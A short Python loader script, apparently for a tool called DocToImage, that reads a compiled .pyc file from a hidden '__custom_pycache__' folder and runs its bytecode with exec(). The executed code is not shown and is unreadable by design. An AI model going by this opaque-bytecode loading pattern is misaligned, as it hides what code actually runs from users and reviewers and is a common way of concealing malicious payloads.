
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'DocToImage_33427a3e6ca04e86a35a54fc84de4a6b.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
